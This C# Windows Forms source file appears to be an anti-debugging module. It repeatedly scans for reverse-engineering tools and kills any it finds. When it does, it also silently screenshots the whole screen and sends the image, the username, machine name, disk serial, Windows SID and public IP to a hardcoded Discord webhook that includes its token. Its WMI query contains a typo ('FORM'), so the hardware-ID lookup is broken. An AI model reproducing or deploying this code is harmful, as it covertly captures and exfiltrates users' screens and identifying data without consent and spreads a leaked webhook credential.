using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Security.Principal;

namespace WindowsFormsApp3
{
    public partial class Form1 : Form
    {
        private Timer timer;
        public Form1()
        {
            InitializeComponent();
            timer = new Timer();
            timer.Interval = 5000;
            timer.Tick += Timer_Tick;
            timer.Start();
        }
        private List<string> programsToCheck = new List<string> { "dump", "ilspy", "memory v", "x32dbg", "sharpod", "x64dbg", "x32_dbg", "x64_dbg", "strongod", "titanHide", "scyllaHide", "graywolf", "X64netdumper", "megadumper", "simpleassemblyexplorer", "ollydbg", "ida", "httpdebug", "ProcessHacker", "ResourceHacker", "ExeinfoPE", "DetectItEasy", "PEiD", "cheatengine-x86_64-SSE4-AVX2", "Cheat Engine", "DnSpy", };

        private void Timer_Tick(object sender, EventArgs e)
        {
            foreach (string programName in programsToCheck)
            {
                CheckAndNotifyProcess(programName);
            }
        }

        private void CheckAndNotifyProcess(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);

            if (processes.Length > 0)
            {
                foreach (Process process in processes)
                {
                    SendWebhookNotfication(processName);
                    process.Kill();
                }
            }
        }

        private async void SendWebhookNotfication(string processName)
        {
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);

            string screenshotPath = Path.Combine(Path.GetTempPath(), "screenshot.png");
            screenshot.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);

            await SendToDiscordWebhook(screenshotPath);

            File.Delete(screenshotPath);

            string webhookUrl = "https://discord.com/api/webhooks/1283112318569414706/TaFHOU_lEGLpSrCwFlN_Z-5RJtO0gk2CGg04wFlIrqQYlT9SR9g-qnx7xJYo0bHWWXNo";
            string deviceName = Environment.MachineName;
            string userName = Environment.UserName;
            string hwid = GetHWID();
            string sid = GetSID();

            string embedMessage = $"Unwanted process detected on device '{deviceName}'";
            string message = $"(user: {userName}, HWID: {hwid}, SID: {sid}): {processName}";

            try
            {
                using (var client = new WebClient())
                {
                    client.Headers[HttpRequestHeader.ContentType] = "application/json";
                    string ipAddress = GetIPAddress();

                    string jsonPayload = @"
        {
            ""embeds"": [
                {
                    ""title"": ""Unwanted Process Detected"",
                    ""description"": """ + embedMessage + @""",
                    ""fields"": [
                        {
                            ""name"": ""User"",
                            ""value"": """ + userName + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""HWID"",
                            ""value"": """ + hwid + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""SID"",
                            ""value"": """ + sid + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""IP Address"",
                            ""value"": """ + ipAddress + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""Process Name"",
                            ""value"": """ + processName + @""",
                            ""inline"": false
                        }
                    ],
                    ""color"": 16711680
                }
            ]
        }";

                    client.UploadString(webhookUrl, "POST", jsonPayload);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error sending webhook notification: " + ex.Message);
            }
        }

        private string GetSID()
        {
            try
            {
                WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
                return currentUser.User.Value;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error Sid: " + ex.Message);
                return string.Empty;
            }
        }

        private string GetHWID()
        {
            string result = string.Empty;
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FORM Win32_DiskDrive");
                foreach (ManagementObject wmi in searcher.Get())
                {
                    if (wmi["SerialNumber"] != null)
                    {
                        result = wmi["SerialNumber"].ToString();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Faild to HWID: " + ex.Message);
            }
            return result;
        }

        private string GetIPAddress()
        {
            string ipAddress = string.Empty;
            try
            {
                ipAddress = new WebClient().DownloadString("https://api.ipify.org");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failel to get ip address : " + ex.Message);
            }
            return ipAddress;
        }

        private async Task SendToDiscordWebhook(string imagePath)
        {
            string webhookUrl = "https://discord.com/api/webhooks/1283112318569414706/TaFHOU_lEGLpSrCwFlN_Z-5RJtO0gk2CGg04wFlIrqQYlT9SR9g-qnx7xJYo0bHWWXNo";

            using (var httpClient = new HttpClient())
            {
                using (var form = new MultipartFormDataContent())
                {
                    using (var fileStream = new FileStream(imagePath, FileMode.Open))
                    {
                        form.Add(new StreamContent(fileStream), "file", "screenshot.png");

                        var response = await httpClient.PostAsync(webhookUrl, form);
                        response.EnsureSuccessStatusCode();
                    }
                }
            }
        }

        


        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
